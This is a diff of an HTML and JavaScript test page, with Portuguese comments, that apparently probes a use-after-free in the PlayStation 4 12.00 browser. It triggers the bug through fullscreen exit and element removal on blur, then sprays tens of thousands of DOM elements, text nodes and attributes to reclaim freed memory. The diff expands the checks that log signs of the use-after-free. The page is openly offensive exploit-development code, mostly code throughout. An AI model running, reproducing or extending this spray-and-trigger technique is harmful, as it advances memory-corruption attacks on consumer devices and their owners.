@@ -2,11 +2,11 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Aggressive Reclaim (Patched)</title>
+<title>PS4 12.00 - UAF Aggressive Reclaim (Expanded Check)</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>PS4 12.00 - UAF Aggressive Reclaim (Patched)</h2>
+<h2>PS4 12.00 - UAF Aggressive Reclaim (Expanded Check)</h2>
 <button onclick="runTest()">Run Test</button>
 
 <div id="log" style="margin-top:20px;"></div>
@@ -66,34 +66,28 @@ function aggressiveReclaim() {
 
     let bucket = [];
 
-    // Fase 1 — churn pesado
     for (let i = 0; i < 8000; i++) {
         let el = document.createElement("div");
         document.body.appendChild(el);
         el.remove();
     }
 
-    // Fase 2 — Element spray
     for (let i = 0; i < 10000; i++) {
         let el = document.createElement("div");
-
         el.innerHTML = "REUSE_EL_" + i;
         el.style.position = "absolute";
         el.style.width = "100%";
         el.style.height = "100%";
-
         document.body.appendChild(el);
         bucket.push(el);
     }
 
-    // Fase 3 — TextNode spray
     for (let i = 0; i < 10000; i++) {
         let txt = document.createTextNode("TXT_" + i);
         document.body.appendChild(txt);
         bucket.push(txt);
     }
 
-    // Fase 4 — Attribute spray
     for (let i = 0; i < 10000; i++) {
         let el = document.createElement("div");
         el.setAttribute("data-x", "ATTR_" + i);
@@ -101,7 +95,6 @@ function aggressiveReclaim() {
         bucket.push(el);
     }
 
-    // Fase 5 — churn novamente
     for (let i = 0; i < 5000; i++) {
         let el = document.createElement("span");
         document.body.appendChild(el);
@@ -113,35 +106,56 @@ function aggressiveReclaim() {
 }
 
 // ==========================
-// DETECÇÃO (INALTERADO)
+// 🔬 DETECÇÃO EXPANDIDA
 // ==========================
 function checkUAF(fsTarget) {
     log("---- CHECK UAF ----");
 
     try {
-        let val = fsTarget.innerHTML;
-        log("[CHECK] innerHTML = " + val);
+        log("[CHECK] innerHTML = " + fsTarget.innerHTML);
     } catch(e) {
         log("[UAF] innerHTML erro: " + e);
     }
 
     try {
-        let attr = fsTarget.getAttribute("data-x");
-        log("[CHECK] data-x = " + attr);
+        log("[CHECK] outerHTML = " + fsTarget.outerHTML);
     } catch(e) {
-        log("[UAF] attribute erro: " + e);
+        log("[UAF] outerHTML erro: " + e);
     }
 
     try {
-        let node = fsTarget.firstChild;
-        log("[CHECK] firstChild = " + node);
+        log("[CHECK] id = " + fsTarget.id);
+    } catch(e) {
+        log("[UAF] id erro: " + e);
+    }
+
+    try {
+        log("[CHECK] className = " + fsTarget.className);
+    } catch(e) {
+        log("[UAF] class erro: " + e);
+    }
+
+    try {
+        log("[CHECK] childNodes.length = " + fsTarget.childNodes.length);
+    } catch(e) {
+        log("[UAF] childNodes erro: " + e);
+    }
+
+    try {
+        log("[CHECK] firstChild = " + fsTarget.firstChild);
     } catch(e) {
         log("[UAF] firstChild erro: " + e);
+    }
+
+    try {
+        log("[CHECK] data-x = " + fsTarget.getAttribute("data-x"));
+    } catch(e) {
+        log("[UAF] attribute erro: " + e);
     }
 }
 
 // ==========================
-// TRIGGER (PATCH MÍNIMO)
+// TRIGGER (INALTERADO + PATCH CHECKS)
 // ==========================
 function trigger(fsTarget) {
     log("[*] Trigger: remove + exitFullscreen");
@@ -157,19 +171,17 @@ function trigger(fsTarget) {
         log("[ERRO] " + e);
     }
 
-    // 🔥 janela crítica — múltiplos reclaims (INALTERADO)
     setTimeout(() => aggressiveReclaim(), 0);
     setTimeout(() => aggressiveReclaim(), 50);
     setTimeout(() => aggressiveReclaim(), 100);
 
-    // 🔬 PATCH — checks progressivos (NÃO altera lógica)
+    // 🔬 CHECKS PROGRESSIVOS
     setTimeout(() => checkUAF(fsTarget), 10);
     setTimeout(() => checkUAF(fsTarget), 30);
     setTimeout(() => checkUAF(fsTarget), 60);
     setTimeout(() => checkUAF(fsTarget), 120);
     setTimeout(() => checkUAF(fsTarget), 250);
 
-    // 🔁 comportamento original PRESERVADO
     setTimeout(() => location.reload(), 500);
 }
 
@@ -188,7 +200,6 @@ function runTest() {
     window.onblur = function() {
         log("[*] onblur disparado");
 
-        // timing original intacto
         setTimeout(() => trigger(fsTarget), 3000);
     };
 }
